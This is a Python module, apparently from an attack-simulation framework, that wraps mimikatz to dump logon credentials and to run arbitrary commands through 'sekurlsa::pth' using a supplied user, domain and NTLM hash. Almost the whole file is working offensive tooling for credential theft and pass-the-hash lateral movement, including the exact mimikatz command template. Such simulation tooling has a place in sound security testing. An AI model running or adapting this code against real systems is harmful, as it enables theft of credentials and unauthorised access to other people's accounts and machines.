from ai_utils.scenarios.globals import PathUtils
import logging
try:
    import aipythonlib
except Exception as e:
    logging.error('Error importing aipythonlib: {0}'.format(e))

class PassTheHashUtilsClass(object):

    MIMIKATZ_FILENAME = PathUtils.FindFile("mimikatz.exe")
    MIMIKATZ_PTH_CMD = 'privilege::debug "sekurlsa::pth /user:{0} /domain:{1} /ntlm:{2} /run:"{3}"" exit'

    @staticmethod
    def GetCredentials():
        mimikatz = aipythonlib.AiMimikatzClass(True)
        return mimikatz.GetLogonData()

    @staticmethod
    def Execute(domain, username, passwordHash, command, timeout=3000):
        """This method executes a command using the provided domain, user and password hash. More specifically, this method
        will execute te sekurlsa::pth command from mimikatz.

        With this return value you can not conclude if the provided command has been successful. If mimikatz is correctly
        executed, this method will return True even if the domain, user, password hash or commands are invalids.
        A good approach to test if the command was successful is to write the command output into a file and check it.

        :returns bool: Returns True if mimikatz was successful and False otherwise.
        """
        logging.info(PassTheHashUtilsClass.INFO1)
        success = False
        #commandFile = PassTheHashUtilsClass._WriteCommandToFile(command)   # TODO: should be commented until AiRunCommand children bug is solved
        commandFile = command
        mimikatzCmd = PassTheHashUtilsClass.MIMIKATZ_PTH_CMD.format(username, domain, passwordHash, commandFile)
        if PassTheHashUtilsClass.MIMIKATZ_FILENAME and commandFile:
            errorCode, exitCode, stdOut, stdError = aipythonlib.AiRunCommand(PassTheHashUtilsClass.MIMIKATZ_FILENAME, mimikatzCmd, timeout, True)
            #FileUtils.DeleteFile(commandFile)  # TODO: should be commented until AiRunCommand children bug is solved
            success = PassTheHashUtilsClass._LogSuccess(errorCode, stdError)
        return success

    ###
    # Internal Methods
    ##################

    @staticmethod
    def _WriteCommandToFile(cmd):
        try:
            commandFile = PathUtils.GetTempFile('ai-', '.bat')
            with open(commandFile, 'w') as fd:
                fd.write(cmd)
                fd.write('\nexit /b 0')
        except Exception as ex:
            commandFile = ''
            logging.error(PassTheHashUtilsClass.ERROR2.format(ex))
        return commandFile

    @staticmethod
    def _LogSuccess(errorCode, stdError):
        success = False
        if errorCode == 0 and not stdError:
            logging.info(PassTheHashUtilsClass.INFO2)
            success = True
        else:
            logging.error(PassTheHashUtilsClass.ERROR1.format(errorCode, stdError.strip()))
        return success

    ##
    # Constant strings
    ##################

    INFO1 = 'Executing remote command using password hash...'
    INFO2 = 'Command was successfully executed using pass the hash'

    ERROR1 = 'Command could not be executed passing the hash using Mimikatz. Error Code: {0}. Error Message: {1}'
    ERROR2 = 'Command file could not be created. Pass the hash util will fail. Error: {0}'
